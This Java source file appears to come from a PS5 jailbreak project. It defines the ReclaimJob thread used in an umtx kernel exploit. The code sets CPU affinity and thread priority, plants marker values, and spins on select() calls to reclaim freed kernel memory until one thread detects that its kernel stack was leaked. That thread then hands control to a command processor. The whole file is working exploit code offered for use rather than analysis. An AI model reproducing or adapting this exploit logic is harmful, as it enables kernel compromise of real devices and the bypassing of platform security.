package org.ps5jb.client.payloads.umtx.impl1;

import org.ps5jb.client.payloads.umtx.common.CommandProcessor;
import org.ps5jb.client.payloads.umtx.common.DebugStatus;
import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.sdk.core.SdkException;
import org.ps5jb.sdk.include.sys.CpuSet;
import org.ps5jb.sdk.include.sys.RtPrio;
import org.ps5jb.sdk.include.sys.cpuset.CpuSetType;

public class ReclaimJob extends CommonJob {
    private final State state;
    private final CpuSet cpuSet;

    private final int index;
    private final int marker;
    private final Pointer markerAddress;
    private final Pointer markerCopyAddress;

    private CpuSetType initialCpuAffinity;

    private boolean isTarget;

    private volatile CommandProcessor commandProcessor;

    public ReclaimJob(int index, State state) {
        super();

        this.cpuSet = new CpuSet(this.libKernel);
        this.index = index;
        this.state = state;

        this.jobName = "reclaim#" + index;
        this.marker = Config.RECLAIM_THREAD_MARKER_BASE | ((0x41 + index + 1) << 16);
        this.markerAddress = this.state.reclaimJobStatesAddress.inc(index * Config.STATE_SIZE);
        this.markerCopyAddress = this.markerAddress.inc(Config.MARKER_SIZE);
        this.isTarget = false;
    }

    protected void prepare() throws SdkException {
        super.prepare();

        initialCpuAffinity = cpuSet.getCurrentThreadAffinity();
        if (DebugStatus.isTraceEnabled()) {
            DebugStatus.trace("Initial CPU affinity of '" + jobName + "' = " + initialCpuAffinity);
        }

        if (Config.toggleReclaimCpuAffinityMask) {
            if (Config.toggleDestroyerAffinityOnReclaimThread && this.state.destroyerThreadIndex != -1) {
                cpuSet.setCurrentThreadAffinity(this.state.DESTROYER_THREAD_CORES[this.state.destroyerThreadIndex]);
                if (this.index == 0) {
                    DebugStatus.info("Set affinity to " + libKernel.sceKernelGetCurrentCpu() + " from destroyer #" + this.state.destroyerThreadIndex);
                }
            } else {
                cpuSet.setCurrentThreadAffinity(this.state.LOOKUP_THREAD_CORES);
                if (this.index == 0) {
                    DebugStatus.info("Set affinity to " + libKernel.sceKernelGetCurrentCpu() + " from lookup");
                }
            }
        }

        if (Config.toggleSetThreadPriorities && Config.toggleEnableThreadPriorityForReclaimThreads) {
            RtPrio rtprio = new RtPrio(this.libKernel);
            rtprio.setRtPrio(0, Config.RECLAIM_THREAD_PRIORITY);
        }

        // Prepare thread marker which will be used to determine victim thread ID: 13 37 [41 + index + 1]
        markerAddress.write8(((long) marker) << 32);
    }

    protected void work() throws SdkException {
        DebugStatus.trace("Waiting for ready flag");
        while (!this.state.readyFlag.get()) {
            thread_yield();
        }

        DebugStatus.trace("Starting loop");

        // Wait loop that runs until kernel stack is obtained.
        while (!this.state.destroyFlag.get()) {
            DebugStatus.trace("Doing blocking call");

            // Use copy of marker because `select` may overwrite its contents.
            markerAddress.copyTo(markerCopyAddress, 0, (int) Config.MARKER_SIZE);
            this.libKernel.select(1, markerCopyAddress, Pointer.NULL, Pointer.NULL, this.state.timeoutAddress.getPointer());
            thread_yield();

            // Check if leaked kernel stack belongs to this thread.
            if (isTarget) {
                DebugStatus.info("I am lucky");

                if (Config.toggleReclaimCpuAffinityMask) {
                    cpuSet.setCurrentThreadAffinity(initialCpuAffinity);
                }

                break;
            }
        }

        DebugStatus.trace("Finishing loop");

        if (isTarget) {
            DebugStatus.debug("Waiting for ready flag");
            while (!this.state.readyFlag.get()) {
                thread_yield();
            }

            DebugStatus.notice("Starting command processor loop");
            handleCommands();
            DebugStatus.notice("Stopping command processor loop");

            DebugStatus.notice("Ending target thread");
        } else {
            DebugStatus.notice("Not target thread");
        }
    }

    protected void postprocess() {
        super.postprocess();

        if (this.initialCpuAffinity != null) {
            this.initialCpuAffinity.free();
            this.initialCpuAffinity = null;
        }

        if (commandProcessor != null) {
            commandProcessor.cmd.set(CommandProcessor.CMD_EXIT);
            commandProcessor = null;
        }
    }

    protected CommandProcessor getCommandProcessor() {
        return commandProcessor;
    }

    public boolean isCommandProccesorRunning() {
        return commandProcessor != null;
    }

    private void handleCommands() {
        if (commandProcessor == null) {
            this.commandProcessor = new CommandProcessor();
        }
        commandProcessor.handleCommands();
    }

    public void setTarget(boolean flag) {
        isTarget = flag;
    }

    public boolean isTarget() {
        return isTarget;
    }
}